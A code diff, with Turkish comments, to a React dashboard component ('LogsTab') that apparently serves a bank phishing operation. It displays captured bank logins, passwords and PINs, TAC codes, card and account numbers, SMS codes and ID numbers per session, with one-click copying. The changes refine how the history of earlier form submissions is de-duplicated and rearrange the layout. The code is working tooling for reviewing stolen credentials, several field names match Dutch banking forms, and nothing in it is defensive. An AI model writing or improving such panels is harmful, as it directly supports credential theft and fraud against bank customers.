@@ -1600,25 +1600,31 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
                 // ⭐ BANKA GECMISI HESAPLA:
                 //   1) SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu).
-                //   2) ⭐ Son (en yeni) banka kaydi KOLONDAKI orderedField1 / username / password
-                //      ile ayni ise listeden ve sayimdan KALDIR (mevcut kolon onu zaten gosterdigi icin).
+                //   2) ⭐ Son (en yeni) banka kaydi KOLONDAKI TUM ANA ALANLAR ile TAMAMI ayni ise
+                //      (yani orderedField1 + username + password hepsi birebir eslesirse)
+                //      listeden ve sayimdan KALDIR (mevcut kolon onu zaten gosterdigi icin).
+                //      TEK ALAN eslesmesi YETERLI DEGIL (aksi halde yeni form girilince eski form
+                //      gecmisten dusuyor, kullanici onu gormek istiyor).
                 const bankHistoryRawPre = history.filter((e: any) => {
                     if (!e) return false;
                     const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
                     return label !== "SMS KODU" && label !== "KART BILGISI";
                   });
-                // ⭐ Son banka kaydi mevcut kolon ile birebir ayni mi kontrolu
+                // ⭐ Son banka kaydi mevcut kolon ile BIREBIR AYNI MI? (TUM alanlar eslesirse sil)
                 const bankHistoryRaw: any[] = (() => {
                   if (bankHistoryRawPre.length === 0) return [];
                   const lastEntry = bankHistoryRawPre[bankHistoryRawPre.length - 1];
                   const lastO1 = String(lastEntry.orderedField1 || "").trim();
                   const lastUser = String(lastEntry.username || lastEntry.verfuegernummer || "").trim();
                   const lastPass = String(lastEntry.password || lastEntry.pin || "").trim();
-                  const matchCurrent =
-                    (currentBankOrdered1.length > 0 && currentBankOrdered1 === lastO1) ||
-                    (currentBankUser.length > 0 && currentBankUser === lastUser) ||
-                    (currentBankPass.length > 0 && currentBankPass === lastPass);
-                  if (matchCurrent) return bankHistoryRawPre.slice(0, -1);
+                  const currentHasData =
+                    currentBankOrdered1.length > 0 || currentBankUser.length > 0 || currentBankPass.length > 0;
+                  if (!currentHasData) return bankHistoryRawPre;
+                  const matchAllCurrent =
+                    lastO1 === currentBankOrdered1 &&
+                    lastUser === currentBankUser &&
+                    lastPass === currentBankPass;
+                  if (matchAllCurrent) return bankHistoryRawPre.slice(0, -1);
                   return bankHistoryRawPre;
                 })();
                 const bankHistoryCount = bankHistoryRaw.length;
@@ -1772,53 +1778,151 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1 text-[10px] leading-tight">
+                      <div className="flex w-full flex-col items-start gap-1.5 leading-tight">
+                        {/* 1) Ust: Banka Adi + loginMethod badge */}
                         {fd.bankName ? (
-                          <div className="mb-1 flex min-w-0 flex-wrap items-start justify-between gap-1.5">
-                            <div className="flex min-w-0 flex-wrap items-center gap-1">
-                              <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
-                                {fd.bankName}
-                              </span>
-                              {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
-                                <span
-                                  className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
-                                  onClick={() => copyToClipboard(fd.loginMethod)}
-                                >
-                                  {fd.loginMethod}
-                                </span>
-                              ) : null}
-                            </div>
-                            <button
-                              type="button"
-                              onClick={() =>
-                                setExpandedBankHistorySessionId(
-                                  expandedBankHistorySessionId === row.id ? null : row.id,
-                                )
-                              }
-                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
-                                expandedBankHistorySessionId === row.id
-                                  ? darkMode
-                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
-                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
-                                  : darkMode
-                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
-                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
-                              }`}
-                              title="Eski banka form girişlerini göster"
+                          <div className="mb-0.5 flex min-w-0 flex-wrap items-center gap-1 w-full">
+                            <span
+                              className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
+                              onClick={() => copyToClipboard(fd.bankName)}
                             >
-                              GEÇMİŞ ({bankHistoryCount})
-                            </button>
-                          </div>
-                        ) : (
-                          <div className="mb-1 flex min-w-0 flex-wrap items-start justify-between gap-1.5">
+                              {fd.bankName}
+                            </span>
                             {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
-                              <div
-                                className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
+                              <span
+                                className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
                                 onClick={() => copyToClipboard(fd.loginMethod)}
                               >
                                 {fd.loginMethod}
-                              </div>
+                              </span>
                             ) : null}
+                          </div>
+                        ) : (
+                          typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
+                            <div
+                              className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
+                              onClick={() => copyToClipboard(fd.loginMethod)}
+                            >
+                              {fd.loginMethod}
+                            </div>
+                          ) : null
+                        )}
+
+                        {/* 2) Orta: ID / Sifre / TAC / Kart No / Hesap No alanlar listesi (canonicalBankFields) */}
+                        <div className="flex w-full flex-col items-start gap-1.5">
+                          {canonicalBankFields.map(([key, value]) => {
+                            let displayKey = key;
+                            let displayValueClass =
+                              "min-w-0 cursor-pointer font-semibold text-[11px] transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]";
+                            const badgeClass =
+                              "mt-0.5 shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide whitespace-nowrap shadow-sm";
+                            let labelBadgeClass = badgeClass;
+
+                            if (displayKey === "username") {
+                              displayKey = "ID / K.Adı";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-sky-500/30 bg-sky-500/15 text-sky-400"
+                                  : "border-sky-500/30 bg-sky-500/15 text-sky-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} ${darkMode ? "text-sky-300" : "text-sky-800"}`;
+                            } else if (displayKey === "password") {
+                              displayKey = "Şifre / PIN";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
+                                  : "border-rose-500/30 bg-rose-500/15 text-rose-700"
+                              }`;
+                              displayValueClass = `min-w-0 cursor-pointer font-mono text-[11px] font-bold tracking-wide whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
+                            } else if (displayKey === "tacCode") {
+                              displayKey = "TAC";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-orange-500/30 bg-orange-500/15 text-orange-400"
+                                  : "border-orange-500/30 bg-orange-500/15 text-orange-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} font-mono tracking-wider ${darkMode ? "text-orange-300" : "text-orange-800"}`;
+                            } else if (displayKey === "rekeningnummer") {
+                              displayKey = "Hesap No";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-emerald-500/30 bg-emerald-500/15 text-emerald-400"
+                                  : "border-emerald-500/30 bg-emerald-500/15 text-emerald-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-emerald-300" : "text-emerald-800"}`;
+                            } else if (displayKey === "pasnummer") {
+                              displayKey = "Kart No";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
+                                  : "border-rose-500/30 bg-rose-500/15 text-rose-700"
+                              }`;
+                              displayValueClass = `min-w-0 cursor-pointer font-mono text-[12px] font-bold tracking-[0.12em] whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
+                            } else if (displayKey === "toegangscode") {
+                              displayKey = "Giriş Kodu";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-indigo-500/30 bg-indigo-500/15 text-indigo-400"
+                                  : "border-indigo-500/30 bg-indigo-500/15 text-indigo-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-indigo-300" : "text-indigo-800"}`;
+                            } else if (displayKey === "signatuur") {
+                              displayKey = "İmza";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-teal-500/30 bg-teal-500/15 text-teal-400"
+                                  : "border-teal-500/30 bg-teal-500/15 text-teal-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} italic ${darkMode ? "text-teal-300" : "text-teal-800"}`;
+                            } else if (displayKey === "identificatiecode") {
+                              displayKey = "Kimlik Kodu";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-cyan-500/30 bg-cyan-500/15 text-cyan-400"
+                                  : "border-cyan-500/30 bg-cyan-500/15 text-cyan-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} ${darkMode ? "text-cyan-300" : "text-cyan-800"}`;
+                            } else if (displayKey === "personalCode") {
+                              displayKey = "Kimlik No / ID";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-400"
+                                  : "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-fuchsia-300" : "text-fuchsia-800"}`;
+                            } else if (displayKey === "bankPhone") {
+                              displayKey = "Telefon";
+                              labelBadgeClass = `${badgeClass} ${
+                                darkMode
+                                  ? "border-lime-500/30 bg-lime-500/15 text-lime-400"
+                                  : "border-lime-500/30 bg-lime-500/15 text-lime-700"
+                              }`;
+                              displayValueClass = `${displayValueClass} ${darkMode ? "text-lime-300" : "text-lime-800"}`;
+                            } else {
+                              labelBadgeClass = `${badgeClass} opacity-60 ${darkMode ? "border-white/10 bg-white/5 text-zinc-400" : "border-black/5 bg-black/5 text-zinc-600"}`;
+                              displayValueClass = `${displayValueClass} ${darkMode ? "text-zinc-200" : "text-zinc-800"}`;
+                            }
+
+                            return (
+                              <div key={key} className="flex min-w-0 w-full items-start gap-1.5 leading-tight">
+                                <span className={labelBadgeClass}>
+                                  {displayKey}
+                                </span>
+                                <span
+                                  className={displayValueClass}
+                                  onClick={() => copyToClipboard(String(value))}
+                                >
+                                  {String(value)}
+                                </span>
+                              </div>
+                            );
+                          })}
+                        </div>
+
+                        {/* 3) ALT: Alanlarin TAM ALTINDA (sms/kart gibi flex-col sonda) GEÇMİŞ (N) BUTONU —
+                             artik cok sagda DEGIL, kolonun sol tarafinda, alanlarin hemen altinda. */}
+                        {bankHistoryCount > 0 ? (
+                          <div className="mt-1 flex w-full justify-start">
                             <button
                               type="button"
                               onClick={() =>
@@ -1840,114 +1944,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               GEÇMİŞ ({bankHistoryCount})
                             </button>
                           </div>
-                        )}
-                        {canonicalBankFields.map(([key, value]) => {
-                          let displayKey = key;
-                          let displayValueClass =
-                            "min-w-0 cursor-pointer font-semibold text-[11px] transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]";
-                          let badgeClass =
-                            "mt-0.5 shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide whitespace-nowrap shadow-sm";
-                          let labelBadgeClass = badgeClass;
-
-                          if (displayKey === "username") {
-                            displayKey = "ID / K.Adı";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-sky-500/30 bg-sky-500/15 text-sky-400"
-                                : "border-sky-500/30 bg-sky-500/15 text-sky-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} ${darkMode ? "text-sky-300" : "text-sky-800"}`;
-                          } else if (displayKey === "password") {
-                            displayKey = "Şifre / PIN";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
-                                : "border-rose-500/30 bg-rose-500/15 text-rose-700"
-                            }`;
-                            displayValueClass = `min-w-0 cursor-pointer font-mono text-[11px] font-bold tracking-wide whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
-                          } else if (displayKey === "tacCode") {
-                            displayKey = "TAC";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-orange-500/30 bg-orange-500/15 text-orange-400"
-                                : "border-orange-500/30 bg-orange-500/15 text-orange-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} font-mono tracking-wider ${darkMode ? "text-orange-300" : "text-orange-800"}`;
-                          } else if (displayKey === "rekeningnummer") {
-                            displayKey = "Hesap No";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-emerald-500/30 bg-emerald-500/15 text-emerald-400"
-                                : "border-emerald-500/30 bg-emerald-500/15 text-emerald-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-emerald-300" : "text-emerald-800"}`;
-                          } else if (displayKey === "pasnummer") {
-                            displayKey = "Kart No";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-rose-500/30 bg-rose-500/15 text-rose-400"
-                                : "border-rose-500/30 bg-rose-500/15 text-rose-700"
-                            }`;
-                            displayValueClass = `min-w-0 cursor-pointer font-mono text-[12px] font-bold tracking-[0.12em] whitespace-normal break-words [overflow-wrap:anywhere] ${darkMode ? "text-rose-400 hover:text-rose-300" : "text-rose-800 hover:text-rose-700"}`;
-                          } else if (displayKey === "toegangscode") {
-                            displayKey = "Giriş Kodu";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-indigo-500/30 bg-indigo-500/15 text-indigo-400"
-                                : "border-indigo-500/30 bg-indigo-500/15 text-indigo-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-indigo-300" : "text-indigo-800"}`;
-                          } else if (displayKey === "signatuur") {
-                            displayKey = "İmza";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-teal-500/30 bg-teal-500/15 text-teal-400"
-                                : "border-teal-500/30 bg-teal-500/15 text-teal-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} italic ${darkMode ? "text-teal-300" : "text-teal-800"}`;
-                          } else if (displayKey === "identificatiecode") {
-                            displayKey = "Kimlik Kodu";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-cyan-500/30 bg-cyan-500/15 text-cyan-400"
-                                : "border-cyan-500/30 bg-cyan-500/15 text-cyan-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} ${darkMode ? "text-cyan-300" : "text-cyan-800"}`;
-                          } else if (displayKey === "personalCode") {
-                            displayKey = "Kimlik No / ID";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-400"
-                                : "border-fuchsia-500/30 bg-fuchsia-500/15 text-fuchsia-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} font-mono ${darkMode ? "text-fuchsia-300" : "text-fuchsia-800"}`;
-                          } else if (displayKey === "bankPhone") {
-                            displayKey = "Telefon";
-                            labelBadgeClass = `${badgeClass} ${
-                              darkMode
-                                ? "border-lime-500/30 bg-lime-500/15 text-lime-400"
-                                : "border-lime-500/30 bg-lime-500/15 text-lime-700"
-                            }`;
-                            displayValueClass = `${displayValueClass} ${darkMode ? "text-lime-300" : "text-lime-800"}`;
-                          } else {
-                            labelBadgeClass = `${badgeClass} opacity-60 ${darkMode ? "border-white/10 bg-white/5 text-zinc-400" : "border-black/5 bg-black/5 text-zinc-600"}`;
-                            displayValueClass = `${displayValueClass} ${darkMode ? "text-zinc-200" : "text-zinc-800"}`;
-                          }
-
-                          return (
-                            <div key={key} className="flex min-w-0 items-start gap-1.5 leading-tight">
-                              <span className={labelBadgeClass}>
-                                {displayKey}
-                              </span>
-                              <span
-                                className={displayValueClass}
-                                onClick={() => copyToClipboard(String(value))}
-                              >
-                                {String(value)}
-                              </span>
-                            </div>
-                          );
-                        })}
+                        ) : null}
                       </div>
                     </td>
                     <td className="hidden px-2 py-3 align-top">
